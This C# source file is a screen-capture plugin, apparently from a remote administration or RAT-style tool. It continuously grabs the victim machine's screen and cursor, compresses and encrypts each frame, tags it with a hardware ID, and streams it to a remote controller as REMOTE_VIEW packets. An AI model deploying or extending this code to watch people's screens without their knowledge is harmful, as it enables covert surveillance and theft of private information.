using Shared;
using System;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Drawing.Imaging;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;
using static Shared.Serializer;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace Plugin
{
	internal static class Functions
	{
		internal static Client C;
		public static bool hasToCapture = false;

		[DllImport("user32.dll")]
		private extern static bool GetCursorInfo(ref CURSORINFOHELPER pci);

		[DllImport("user32.dll")]
		private extern static bool GetCursorPos(out Point lpPoint);

		[StructLayout(LayoutKind.Sequential)]
		private struct CURSORINFOHELPER
		{
			public Int32 cbSize;
			public Int32 flags;
			public IntPtr hCursor;
			public Point ptScreenPos;
		}
		private static ImageCodecInfo GetEncoderInfo(ImageFormat format)
		{
			try
			{
				int j = 0;
				ImageCodecInfo[] encoders = ImageCodecInfo.GetImageEncoders();

				j = 0;
				while (j < encoders.Length)
				{
					if (encoders[j].FormatID == format.Guid)
					{
						return encoders[j];
					}
					j += 1;
				}
				//return null;
			}
			catch{}
			return null;
		}

		private static byte[] Capture(int W, int H, int Q, string F, short M = 0)
		{
			try
			{
				Bitmap img = new Bitmap(Screen.AllScreens[0].Bounds.Width, Screen.AllScreens[M].Bounds.Height);

				Graphics graphics = Graphics.FromImage(img);

				graphics.CompositingQuality = System.Drawing.Drawing2D.CompositingQuality.HighSpeed;

				graphics.CopyFromScreen(0, 0, 0, 0, new Size(Screen.AllScreens[M].Bounds.Width, Screen.AllScreens[M].Bounds.Height), CopyPixelOperation.SourceCopy);

				Point P = new Point();

				GetCursorPos(out P);

				CURSORINFOHELPER CS = new CURSORINFOHELPER();

				CS.cbSize = Marshal.SizeOf(CS);

				GetCursorInfo(ref CS);

				if (CS.flags == 0x1) 
				{
					graphics.DrawIcon(Icon.FromHandle(CS.hCursor), P.X, P.Y);
				}

				Bitmap Resize = new Bitmap(W, H);
				Graphics g2 = Graphics.FromImage(Resize);
				g2.CompositingQuality = CompositingQuality.HighSpeed;
				g2.DrawImage(img, new Rectangle(0, 0, W, H), new Rectangle(0, 0, Screen.AllScreens[M].Bounds.Width, Screen.AllScreens[M].Bounds.Height), GraphicsUnit.Pixel);

				EncoderParameter encoderParameter = new EncoderParameter(System.Drawing.Imaging.Encoder.Quality, Q);
				ImageCodecInfo encoderInfo = null;

				if (F == "PNG")
				{
					encoderInfo = GetEncoderInfo(ImageFormat.Png);
				}
				else if (F == "JPEG")
				{
					encoderInfo = GetEncoderInfo(ImageFormat.Jpeg);
				}
				else if (F == "GIF")
				{
					encoderInfo = GetEncoderInfo(ImageFormat.Gif);
				}

				EncoderParameters encoderParameters = new EncoderParameters(1);
				encoderParameters.Param[0] = encoderParameter;
				System.IO.MemoryStream MS = new System.IO.MemoryStream();
				Resize.Save(MS, encoderInfo, encoderParameters);
				graphics.Dispose();
				g2.Dispose();
				img.Dispose();
				Resize.Dispose();
				MS.Dispose();
				encoderParameter.Dispose();
				encoderParameters.Dispose();
				return MS.ToArray();
			}
			catch{}
			return null;
		}

		internal static void SendCapture(int W, int H, int Q, string F, string HWID, string key, string BaseIP) 
		{
			while (Functions.hasToCapture == true) 
			{
				try
				{
					Data D = new Data();
					byte[] captured = Shared.Compressor.QuickLZ.Compress(Functions.Capture(W, H, Q, F), 1);
					D.HWID = HWID;
					D.Type = PacketType.REMOTE_VIEW;
					D.DataReturn = new object[] { captured, Screen.AllScreens[0].Bounds.Size };
					D.IP_Origin = BaseIP;
					SendData(C.S, Encryption.RSMTool.RSMEncrypt(D.Serialize(), Encoding.Unicode.GetBytes(key)));
					//Task.Run(() => Shared.Serializer.SendData(S, Encryption.RSMTool.RSMEncrypt(D.Serialize(), Encoding.Unicode.GetBytes(key))));
				}
				catch { }
			}
		}
	}
}
